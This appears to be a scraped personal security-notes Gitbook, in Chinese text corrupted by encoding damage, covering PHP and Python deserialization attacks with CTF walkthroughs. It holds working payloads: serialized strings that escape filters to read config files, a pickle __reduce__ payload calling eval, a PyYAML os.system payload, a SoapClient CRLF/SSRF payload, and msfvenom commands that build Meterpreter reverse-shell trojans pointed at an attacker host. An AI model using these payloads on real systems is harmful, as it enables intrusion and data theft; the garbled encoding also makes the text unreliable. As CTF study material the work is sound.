ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œåºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp å‡è®¾è¦ä¿å­˜åˆ°sessionçš„æ•°æ®ä¸ºusername=khaz phpæ€ä¹ˆçŸ¥é“è¦ä¿å­˜å“ªäº›æ•°æ®åˆ°sessionä¸­ é€šè¿‡åœ¨$_SESSIONç¯å¢ƒå˜é‡æ³¨å†Œ #å°†usernameå˜é‡ä¿å­˜åˆ°sessionä¸­ ä¼šè¯ç»“æŸåï¼Œå°†$_SESSIONåºåˆ—åŒ–ä¿å­˜åˆ°sessionæ–‡ä»¶ä¸­ã€‚ æ­£å¸¸ä¿å­˜ a:1:{s:8:\"username\";s:4:\"Khaz\";} å¦‚æœæˆ‘ä»¬æ„é€ username=|a:1:{s:8:\"passwd\";s:4:\"Khaz\";} a:1:{s:8:\"username\";s:31:\"|a:1:{s:8:\"passwd\";s:4:\"Khaz\";}\";} ç¬¬äºŒæ¬¡è¯·æ±‚ï¼Œååºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp_serialize æ­£å¸¸ a:1:{s:8:\"username\";s:4:\"Khaz\";} â†’ $_SESSION['username']=Khaz æ”»å‡» a:1:{s:8:\"username\";s:31:\"|a:1:{s:8:\"passwd\";s:4:\"Khaz\";}\";} â†’ $_SESSION['passwd']=Khaz ä»è€Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰$_SESSIONç¯å¢ƒå˜é‡çš„å€¼ è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ— å½¢æˆåŸå›  phpååºåˆ—åŒ–ç‰¹ç‚¹ ä»¥}ä½œä¸ºç»“æŸç¬¦ï¼Œåœ¨}ä¹‹åçš„å­—ç¬¦ä¼šè¢«èˆå» >> array(2) { 'a' => int(1) 'b' => int(2) } ååºåˆ—åŒ–æ—¶ä¼šæ ¹æ®å‰é¢ç»™å®šçš„é•¿åº¦ï¼Œè¯»å–å¯¹åº”é•¿åº¦çš„å­—ç¬¦ä¸² >> array(2) { 'a\";\"' => int(1) 'b' => int(2) } å½“åºåˆ—åŒ–çš„é•¿åº¦/æ•°é‡ä¸å®é™…ä¸ç¬¦æ—¶ï¼Œååºåˆ—åŒ–ä¼šæŠ¥é”™ 1,b=>2,åªæœ‰ä¸¤ä¸ªå€¼ var_dump(unserialize($b)); var_dump(unserialize($a)); ?> >> error error å½“å­˜åœ¨ä»¥ä¸‹æµç¨‹ï¼šåºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ– è¿‡æ»¤ï¼šåœ¨å¯¹å¯æ§å˜é‡è¿›è¡Œè¿‡æ»¤äº†ä¹‹åï¼Œå°±ä¼šä½¿å¾—å…¶åºåˆ—åŒ–çš„é•¿åº¦ä¸å­—ç¬¦ä¸²é•¿åº¦ä¸åŒ¹é…ï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œæ— æ³•æ‰§è¡Œååºåˆ—åŒ–ï¼Œå°±ä¸ä¼šæ‰§è¡Œæ”»å‡»è€…æ„é€ çš„æ”»å‡»ä»£ç ã€‚ä½†æ˜¯åˆ©ç”¨å‰é¢æåˆ°çš„ç¬¬ä¸€å’Œç¬¬äºŒä¸ªç‰¹æ€§ï¼Œæ”»å‡»è€…å¯ä»¥åˆ†æè¿‡æ»¤å‰åå­—ç¬¦ä¸²é•¿åº¦çš„å˜åŒ–ï¼Œæ„é€ å­—ç¬¦ä¸²(å­—ç¬¦ä¸²å½¢å¼ä¸ºè¢«è¿‡æ»¤å­—ç¬¦+ç›®æ ‡å­ä¸²)æ¥è¦†ç›–å…¶ä»–å˜é‡ã€‚ ç›®æ ‡å­—ä¸²ï¼š \";+åºåˆ—åŒ–åçš„å˜é‡+} ä¾‹å¦‚æˆ‘æƒ³è¦é€ƒé€¸$name='khaz'ï¼Œé‚£ä¹ˆç›®æ ‡å­—ä¸²ä¸º\";s:4:\"name\";s:4:\"khaz\";} åˆ†ç±»å’Œæ€è·¯ è¿‡æ»¤åå­—ç¬¦å˜å¤š æ€è·¯ï¼šè®©è¿‡æ»¤åçš„å­—ç¬¦ä¸²å¡«å……å®Œé•¿åº¦ï¼Œä»è€Œè®©åé¢çš„å˜é‡è§£æ”¾å‡ºæ¥ éœ€è¦è®¡ç®—ç›®æ ‡å­—ä¸²çš„é•¿åº¦l1å’Œè¿‡æ»¤åå¢åŠ çš„é•¿åº¦l2 payload:è¢«è¿‡æ»¤å­—ç¬¦*(l1/l2)+ç›®æ ‡å­ä¸² å‡è®¾å¯¹å˜é‡$aè¿›è¡Œè¿‡æ»¤ è¿‡æ»¤è§„åˆ™ï¼šaâ†’bb $aä¸­çš„æ¯ä¸ªaåœ¨è¿‡æ»¤åéƒ½ä¼šä½¿å­—ç¬¦ä¸²é•¿åº¦åŠ 1 å‡è®¾ç›®æ ‡å­ä¸²ä¸ºï¼š\";s:8:\"password\";s:6:\"123456\";} ä¸€å…±31ä¸ªå­—ç¬¦ å°±éœ€è¦é‡å¤a31æ¬¡ï¼Œæ„é€ $a='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:8:\"password\";s:6:\"123456\";}' è¿™æ ·åºåˆ—åŒ–åæœ‰ï¼š s:62:\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:8:\"password\";s:6:\"123456\";}\" æ­¤æ—¶é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:8:\"password\";s:6:\"123456\";} è¿‡æ»¤åï¼š s:62:\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:8:\"password\";s:6:\"123456\";} é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ä»è€Œä½¿s:8:\"password\";s:6:\"123456\";è§£æ”¾å‡ºæ¥ [0CTF 2016]piapiapia www.zipå¾—åˆ°æºç ï¼Œå®¡è®¡å¾—åˆ°å¦‚ä¸‹å…³é”®ç‚¹ flagåœ¨config.php è¿‡æ»¤å‡½æ•° #ç”¨_ä»£æ›¿\\å’Œ\\\\ $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); #ç”¨hackerä»£æ›¿array('select', 'insert', 'update', 'delete', 'where') $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); å­—ç¬¦ä¸²é€ƒé€¸ï¼šå­—ç¬¦ä¸²å˜å¤š whereï¼š5 â†’ hackerï¼š6 ååºåˆ—åŒ–ç‚¹ $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); å­—ç¬¦ä¸²é€ƒé€¸è¦†ç›–$photoä¸ºconfig.php åºåˆ—åŒ–ç‚¹ $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user->update_profile($username, serialize($profile)); æ­£åˆ™ #11ä½æ•°å­— if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); #xxx@xxx.xxx xxxé™åˆ¶[_a-zA-Z0-9] if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); #é•¿åº¦ 10) die('Invalid nickname'); éœ€è¦ç»•è¿‡nicknameçš„æ­£åˆ™ï¼Œç”¨æ•°ç»„ç»•è¿‡å³å¯ã€‚ éœ€è¦é€ƒé€¸çš„å˜é‡ä¸º$photo='config.php'ï¼Œç›®æ ‡å­ä¸²ä¸º\";s:5:\"photo\";s:10:\"config.php\";}ï¼Œå…±33ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ªwhereåœ¨æ›¿æ¢åé•¿åº¦åŠ 1ï¼Œæ‰€ä»¥éœ€è¦33ä¸ªwhereã€‚ payload string(320) \"a:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:16:\"734541725@qq.com\";s:8:\"nickname\";s:198:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";s:5:\"photo\";s:10:\"config.php\";}\";s:5:\"photo\";s:6:\"sadasd\";}\" è¿‡æ»¤å:a:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:16:\"734541725@qq.com\";s:8:\"nickname\";s:198:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";s:5:\"photo\";s:10:\"config.php\";}\";s:5:\"photo\";s:6:\"sadasd\";} ååºåˆ—åŒ–åï¼šE:\\æµè§ˆå™¨ä¸‹è½½\\chrome\\æ–°å»ºæ–‡ä»¶å¤¹\\2.php:21: array(4) { 'phone' => string(11) \"12345678901\" 'email' => string(16) \"734541725@qq.com\" 'nickname' => string(198) \"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\" 'photo' => string(10) \"config.php\" } è¿™é‡Œè¿˜è¦æ³¨æ„çš„ç‚¹å°±æ˜¯å› ä¸ºè¦ç»•è¿‡æ­£åˆ™ï¼Œæ‰€ä»¥nicknameâ†’nickname[]ï¼Œæ•°ç»„åºåˆ—åŒ–åå°±éœ€è¦é—­åˆ{ï¼Œæ‰€ä»¥ nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} 34ä¸ªwhereï¼Œå¹¶ä¸”éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª}æ¥é—­åˆå¤šå‡ºçš„{ > string(24) \"a:1:{i:0;a:1:{i:0;i:1;}}\" è¿‡æ»¤åå­—ç¬¦å˜å°‘ æ€è·¯ï¼šè¿‡æ»¤åå­—ç¬¦å‡å°‘ï¼Œä¼šåƒæ‰åé¢çš„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ è§ä¸‹é¢ä¾‹å­ï¼Œå› ä¸ºè¿™ç§æƒ…å†µéœ€è¦è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²æ‰èƒ½å¾—åˆ°è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯åƒè¿‡æ»¤åå­—ç¬¦å˜å¤šé‚£æ ·å¯ä»¥ç›´æ¥æ„é€ ã€‚ [å®‰æ´µæ¯ 2019]easy_serialize_php è¿‡æ»¤å‡½æ•° function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } å¯æ§å˜é‡ $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; è¿˜æœ‰ä¸€ä¸ª$_SESSION['img']æ˜¯éœ€è¦æˆ‘ä»¬è¦†ç›–çš„å˜é‡ extract($_POST); åºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ– $serialize_info = filter(serialize($_SESSION)); $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img'])); ç›®æ ‡å­ä¸² base64_encode(d0g3_f1ag.php)='ZDBnM19mMWFnLnBocA==' \";s:20:\"ZDBnM19mMWFnLnBocA==\";} è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸² >> è¿‡æ»¤å‰: a:3:{s:4:\"user\";s:4:\"flag\";s:8:\"function\"; s:41:\"\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\"; s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} è¿‡æ»¤å: a:3:{s:4:\"user\";s:4:\"\";s:8:\"function\";s:41:\"\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼š\";s:8:\"function\";s:41:\" é•¿åº¦ä¸º23ï¼Œä¸ä¸º3æˆ–4çš„å€æ•°ï¼Œæœ€æ¥è¿‘çš„æ˜¯24ï¼Œæ‰€ä»¥åœ¨ ç›®æ ‡å­ä¸²å¤´æ·»åŠ ä»»æ„ä¸€ä¸ªå­—ç¬¦å˜æˆa\";s:20:\"ZDBnM19mMWFnLnBocA==\";} æ‰€ä»¥è¿‡æ»¤åä¼šåƒæ‰24ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©4*6æˆ–è€…3*8 payload: >> è¿‡æ»¤å‰: a:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:64:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"khaz\";s:4:\"haha\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} è¿‡æ»¤å: a:3:{s:4:\"user\";s:24:\"\";s:8:\"function\";s:64:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"khaz\";s:4:\"haha\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} E:\\xampp2\\php\\www\\2.php:19: array(3) { 'user' => string(24) \"\";s:8:\"function\";s:64:\"a\" 'img' => string(20) \"ZDBnM19mMWFnLnBocA==\" 'khaz' => string(4) \"haha\" s:4:\"khaz\";s:4:\"haha\";æ·»åŠ äº†è¿™ä¸ªæ˜¯å› ä¸º$_SESSIONæœ‰ä¸‰ä¸ªå€¼(a:3),æ•°é‡è¦å¯¹çš„ä¸Šæ‰èƒ½ååºåˆ—åŒ– s:4:\"user\";s:24:\"\";s:8:\"function\";s:64:\"a\"; s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"; s:4:\"khaz\";s:4:\"haha\"; åŸç”Ÿç±»åˆ©ç”¨ å¸¸è§åœºæ™¯ echo new $this->key($this->value); è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±» å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±» æ¯”å¦‚è¯´é¢˜ç›®ç»™çš„ä»£ç æœ‰MD5ï¼Œevalç­‰ï¼Œè¿™äº›å‡½æ•°çš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥è§¦å‘__tostringé­”æœ¯æ–¹æ³• Error/Exception ç±» ç”¨äºè‡ªå®šä¹‰é”™è¯¯ç±»å‹çš„ ç±» é€‚ç”¨ç‰ˆæœ¬ å±æ€§ï¼ˆä¸€æ ·çš„ï¼‰ Error php7 messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹ fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å Exception php5/php7 lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå· codeï¼šå¼‚å¸¸ä»£ç  >> Error: payload in D:\\phpstudy_pro\\phpstudy_pro\\WWW\\test\\1.php:2 Stack trace: #0 {main} Error: payload in D:\\phpstudy_pro\\phpstudy_pro\\WWW\\test\\1.php:3 Stack trace: #0 {main} ä»”ç»†è§‚å¯Ÿä¼šå‘ç°åªæœ‰å¼‚å¸¸ä»£ç codeæ²¡æœ‰è¢«è¾“å‡ºï¼Œå¹¶ä¸”åªæœ‰è¡Œå·lineä¸åŒ åˆ©ç”¨ å¯ç”¨æ¥ç»•è¿‡ç±»å±æ€§çš„å“ˆå¸Œæ¯”è¾ƒ \"; echo $b; echo \"\"; echo 'md5($a)='.md5($a); echo \"\"; echo 'md5($b)='.md5($b); echo \"\"; echo 'sha1($a)='.sha1($a); echo \"\"; echo 'sha1($b)='.sha1($b); echo \"\"; if($a===$b) echo 'ç›¸åŒ'; else echo 'ä¸ç›¸åŒ'; ?> å€¼ä¸ç›¸åŒï¼ˆå¯¹è±¡ï¼Œå¼‚å¸¸ä»£ç ä¸åŒï¼‰,md5å’Œsha1çš„å€¼ç›¸åŒï¼ˆè¾“å‡ºçš„æ˜¯ä¸€æ ·çš„ï¼‰ [æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ) eval($this->syc); å¤šäº†ä¸€ä¸ªeval åªéœ€è¦å°†payloadæ„é€ ä¸º?>çš„å½¢å¼å³å¯,å‰é¢çš„?>æŠŠæ–‡ä»¶åŸæ¥çš„é—­åˆäº†ã€‚ ) ?> SoapClientç±» å†…ç½®callæ–¹æ³•ï¼Œå½“callæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šå‘èµ·httpè¯·æ±‚ï¼Œå¯ä»¥ä¼ªé€ ssrfè¯·æ±‚ å¹¶å› ä¸ºå¯ä»¥è‡ªå®šä¹‰user_agentè¯·æ±‚å¤´ä»è€Œé€ æˆcrlfæ¼æ´ã€‚ å¯èƒ½ä¼šå‡ºç°çš„é—®é¢˜Fatal error: Uncaught Error: Class 'SoapClient' not found in CRLFæ³¨å…¥æ˜¯ä¸€ç±»æ³¨å…¥æ¼æ´ã€‚æ˜¯â€œå›è½¦+æ¢è¡Œâ€çš„ç®€ç§°ï¼Œåˆå«åšå›è½¦æ¢è¡Œç¬¦ã€‚ è¡¨ç¤ºä¸º\\r\\nï¼Œç¼–ç ä¹‹åæ˜¯%0d%0aã€‚è¿™ä¸ªåœ¨HTTPåè®®ä¸­è¡¨ç¤ºæ¶ˆæ¯å¤´ä¸æ¶ˆæ¯ä½“ä¹‹é—´çš„åˆ†éš”ã€‚ æµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥åˆ†ç¦»HTTPHeaderä¸HTTPBodyçš„ã€‚ä»è€ŒæŠŠHTTPå†…å®¹æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œã€‚ ä¾‹å­SoapClient::callæ–¹æ³•å‘é€soapè¯·æ±‚,ä¼ªé€ postæ•°æ® åœ¨linuxä¸‹æ‰§è¡Œ $target, 'user_agent'=>'khaz^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string, 'uri'=>'hello')); $aaa = serialize($b); $aaa = str_replace('^^',\"\\r\\n\",$aaa); echo urlencode($aaa); //Test $c = unserialize($aaa); $c->notexists(); ?> å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†Content-lengthï¼Œé‚£ä¹ˆè¯»å–äº†data=abcåå°±ä¼šèˆå¼ƒæ‰åé¢çš„æ•°æ® æ–‡ä»¶æ“ä½œç±» æ³¨ï¼šFilesystemIterator æ˜¯DirectoryIteratorçš„å­ç±»ï¼Œæ‰€ä»¥å¯ä»¥å°†DirectoryIteratoræ¢ä¸ºFilesystemIteratorã€‚ éå†ç›®å½• æŸ¥æ‰¾æ–‡ä»¶ æŸ¥æ‰¾æ ¹ç›®å½•çš„flagæ–‡ä»¶å â€‹ GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ ç¡®è®¤æ–‡ä»¶è·¯å¾„ å‡è®¾ç°åœ¨çŸ¥é“flagçš„æ–‡ä»¶åä¸ºflagï¼Œä½†ä¸çŸ¥é“å…·ä½“è·¯å¾„ å½“è¾“å‡ºflagæ—¶ï¼Œè¯´æ˜è·¯å¾„æ˜¯æ­£ç¡®çš„ã€‚ è¯»å–æ–‡ä»¶ ä¸€äº›trick php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿/#16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤) GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸ æ­£å¸¸æƒ…å†µä¸‹æŠ›å‡ºå¼‚å¸¸å¹¶ä¸”æ²¡æœ‰æ•æ‰çš„è¯phpæ˜¯ä¸ä¼šæ‰§è¡Œææ„å‡½æ•°çš„ ä½†åœ¨laravelè¿™ç§æ¡†æ¶é‡Œé€šå¸¸éƒ½æœ‰å…¨å±€çš„é”™è¯¯å¤„ç†ä¸å¼‚å¸¸æ•æ‰ï¼Œæ˜¾ç¤ºé€šç”¨çš„500æˆ–è€…é”™è¯¯é¡µé¢ã€‚ åªè¦å¼‚å¸¸è¢«æ•æ‰ï¼Œåé¢çš„ææ„å°±ä¼šæ‰§è¡Œäº†ã€‚ $a = serialize(array(new test, null)); $a = str_replace('i:1;N', 'i:0;N', $a); å› ä¸ºååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†Array[0]è®¾ç½®ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†Array[0]è®¾ç½®ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„testå¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ__destructäº† ç»•è¿‡æ­£åˆ™ if (preg_match('/^O:\\d+/',$data)){ die('nonono!'); }else{ return $data; } ç”¨+Oä»£æ›¿O ç”¨æ•°ç»„ç»•è¿‡ serialize(array($a)); ç»•è¿‡å­—ç¬¦è¿‡æ»¤ if(preg_match('/username/', $data)){ echo(\"nonono!!!\"); } else{ return $data; } $a = 'O:4:\"test\":1:{s:8:\"username\";s:5:\"admin\";}'; $a = 'O:4:\"test\":1:{S:8:\"\\\\75sername\";s:5:\"admin\";}'; åºåˆ—å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚ ç»•è¿‡wake_up phpç‰ˆæœ¬ PHP5 ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡__wakeup( )çš„æ‰§è¡Œã€‚ file = $file; } function __destruct() { echo @highlight_file($this->file, true); } function __wakeup() { if ($this->file != 'index.php') { //the secret is in the fl4g.php $this->file = 'index.php'; } } } if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(\"index.php\"); } ?> ç»•è¿‡ç‰¹å®šå˜é‡èµ‹å€¼ å¼•ç”¨å˜é‡ åœ¨phpé‡Œ&ç›¸å½“äºä¸¤ä¸ªå˜é‡éƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œä¿®æ”¹ä¸€ä¸ªä¼šå½±å“åˆ°å¦ä¸€ä¸ªã€‚ é€šè¿‡å¯å˜å‡½æ•°è°ƒç”¨ç±»æ–¹æ³• Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-10-21 19:55:18 "},"03.ä»£ç å®¡è®¡/pythonååºåˆ—åŒ–.html":{"url":"03.ä»£ç å®¡è®¡/pythonååºåˆ—åŒ–.html","title":"Pythonååºåˆ—åŒ–","keywords":"","body":"pickleååºåˆ—åŒ–åˆæ¢ é¢˜ç›® https://blog.csdn.net/satasun/article/details/109708593 pythoné­”æœ¯æ–¹æ³•æŒ‡å— https://blog.csdn.net/bluehawksky/article/details/79027055 https://ca01h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ pickle åºåˆ—åŒ– pickle.dump(æ–‡ä»¶) pickle.dumps(å­—ç¬¦ä¸²) ååºåˆ—åŒ– pickle.load(æ–‡ä»¶) pickle.loads(å­—ç¬¦ä¸²) æ£€æµ‹ å…¨å±€æœç´¢Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼â€œimport cPickleâ€æˆ–â€œimport pickleâ€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨cPickle.loads()æˆ–pickle.loads()ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æ§ã€‚ payload #py2 import pickle import urllib class payload(object): def __reduce__(self): #ç¬¬ä¸€ä¸ªå‚æ•°è¿”å›å‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°è¿”å›å‡½æ•°æ‰€éœ€å‚æ•° return (eval, (\"open('/flag.txt','r').read()\",)) a = pickle.dumps(payload()) a = urllib.quote(a) print a yaml åºåˆ—åŒ– yaml.dump() ååºåˆ—åŒ– yaml.load() æ¼æ´æˆå›  ç”±äº YAML ä»…ä»…æ˜¯ä¸€ç§æ ¼å¼è§„èŒƒï¼Œæ‰€ä»¥ç†è®ºä¸Šä¸€ä¸ªæ”¯æŒ YAML çš„è§£æå™¨å¯ä»¥é€‰æ‹©æ€§æ”¯æŒ YAML çš„æŸäº›è¯­æ³•ï¼Œä¹Ÿå¯ä»¥åœ¨ YAML çš„åŸºç¡€ä¸Šåˆ©ç”¨ !! æ¥æ‰©å±•é¢å¤–çš„è§£æèƒ½åŠ›ã€‚ åœ¨pythonçš„ PyYAMLä¸­ yaml import yaml yaml.load('exp: !!python/object/apply:os.system [\"whoami\"]') è¿›å…¥construct_python_object_applyå‡½æ•° è¿›å…¥make_python_instanceå‡½æ•° è¿›å…¥find_python_nameå‡½æ•° ç„¶åreturn getattr('os','system') è¿”å›ç»™cls ç„¶åreturn cls(*args, **kwds) --> os.system(whoami) å°±æ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„å‘½ä»¤ã€‚ æœ€åè¿”å›ç»™instance å¦‚ä½•æ„é€ payload Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-11-11 16:29:45 "},"04.å·¥å…·ä½¿ç”¨/00.æ³¨æ„.html":{"url":"04.å·¥å…·ä½¿ç”¨/00.æ³¨æ„.html","title":"00.æ³¨æ„","keywords":"","body":"ä½¿ç”¨å·¥å…·æ—¶æ³¨æ„/å’Œ\\ï¼Œä¸€å¾‹ç”¨/ï¼Œè¿™æ ·winå’Œlinuxéƒ½èƒ½ç”¨ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-10 16:18:47 "},"04.å·¥å…·ä½¿ç”¨/02.MSF.html":{"url":"04.å·¥å…·ä½¿ç”¨/02.MSF.html","title":"02.MSF","keywords":"","body":"åŸºæœ¬æ­¥éª¤ search xxx # æœç´¢æŸä¸ªæ¨¡å— use xxx # ä½¿ç”¨æŸä¸ªæ¨¡å— show options # æŸ¥çœ‹é…ç½®é€‰é¡¹ set payload # é…ç½®æ”»å‡»è½½è· run/exploit # æ‰§è¡Œæ¸—é€æ”»å‡» æœ¨é©¬ç”Ÿæˆ Winodws msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kaliçš„IP LPORT=Kaliç›‘å¬ç«¯å£ -f exe > msf.exe å‚æ•°é€‰é¡¹ï¼š -p æŒ‡å®šçš„payload -e ç¼–ç å™¨ï¼Œx86/shikata_ga_nai -i è¿­ä»£å™¨ï¼Œå¯¹æœ‰æ•ˆè½½è·çš„ç¼–ç æ¬¡æ•° -f è¾“å‡ºæ–‡ä»¶çš„æ ¼å¼,exeã€dllã€raw Linux msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Kaliçš„IP LPORT=Kaliç›‘å¬ç«¯å£ -f elf > msf.elf chmod +x ./msf.elf # ä¸ºæœ¨é©¬æ·»åŠ æ‰§è¡Œæƒé™ MSFç›‘å¬ use exploit/multi/handler set payload windows/meterpreter/reverse_tcp # 